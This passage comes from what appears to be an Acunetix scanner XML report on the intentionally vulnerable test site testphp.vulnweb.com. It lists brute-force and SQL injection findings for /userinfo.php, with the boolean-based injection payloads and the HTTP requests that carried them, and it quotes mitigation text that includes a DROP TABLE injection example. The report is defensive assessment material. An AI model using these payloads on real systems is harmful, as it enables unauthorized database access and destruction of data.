          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="40" color="blue">
       <Name><![CDATA[Login page password-guessing attack]]></Name>
       <ModuleName><![CDATA[Scripting (Html_Authentication_Audit.script)]]></ModuleName>
       <Details><![CDATA[The scanner tested 10 invalid credentials and no account lockout was detected.]]></Details>
       <Affects><![CDATA[/userinfo.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may attempt to discover a weak password by systematically trying every possible combination of letters, numbers, and symbols until it discovers the one correct combination that works.]]></Impact>
       <Description><![CDATA[A common threat web developers face is a password-guessing attack known as a brute force attack. A brute-force attack is an attempt to discover a password by systematically trying every possible combination of letters, numbers, and symbols until you discover the one correct combination that works. <br/><br/>

This login page doesn't have any protection against password-guessing attacks (brute force attacks). It's recommended to implement some type of account lockout after a defined number of incorrect password attempts. Consult Web references for more information about fixing this problem.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[It's recommended to implement some type of account lockout after a defined number of incorrect password attempts.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /userinfo.php HTTP/1.1
Content-Length: 28
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

pass=Ab3QKdJY&amp;uname=OqrumeHh]]></Request>
        <Response><![CDATA[HTTP/1.1 302 Found
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:25 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Location: login.php
Content-Length: 14
]]></Response>
       </TechnicalDetails>
       <CWE id="307"><![CDATA[CWE-307]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[Low]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Blocking Brute Force Attacks]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Blocking_Brute_Force_Attacks]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="41" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">pass</font></b> was set to <b><font color="dark">-1' OR 3*2*1=6 AND 000204=000204 or 'n9L8cvsQ'='</font></b><br/><br/>Tests performed: <ul><li>-1' OR 2+204-204-1=0+0+0+1 or 'n9L8cvsQ'=' =&gt; <b>TRUE</b></li><li>-1' OR 3+204-204-1=0+0+0+1 or 'n9L8cvsQ'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2&lt;(0+5+204-204) or 'n9L8cvsQ'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2&gt;(0+5+204-204) or 'n9L8cvsQ'=' =&gt; <b>FALSE</b></li><li>-1' OR 2+1-1-1=1 AND 000204=000204 or 'n9L8cvsQ'=' =&gt; <b>TRUE</b></li><li>-1' OR 000204=000204 AND 3+1-1-1=1 or 'n9L8cvsQ'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2=5 AND 000204=000204 or 'n9L8cvsQ'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2=6 AND 000204=000204 or 'n9L8cvsQ'=' =&gt; <b>TRUE</b></li><li>-1' OR 3*2*0=6 AND 000204=000204 or 'n9L8cvsQ'=' =&gt; <b>FALSE</b></li><li>-1' OR 3*2*1=6 AND 000204=000204 or 'n9L8cvsQ'=' =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>g00dPa%24%24w0rD</b>]]></Details>
       <Affects><![CDATA[/userinfo.php]]></Affects>
       <Parameter><![CDATA[pass]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /userinfo.php HTTP/1.1
Content-Length: 80
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

pass=-1'%20OR%203*2*1=6%20AND%20000204=000204%20or%20'n9L8cvsQ'='&amp;uname=yqtjhjpq]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:26 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Set-Cookie: login=test%2Ftest
Original-Content-Encoding: gzip
Content-Length: 5134
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="42" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">pass</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/userinfo.php on line 10</font></pre>]]></Details>
       <Affects><![CDATA[/userinfo.php]]></Affects>
       <Parameter><![CDATA[pass]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
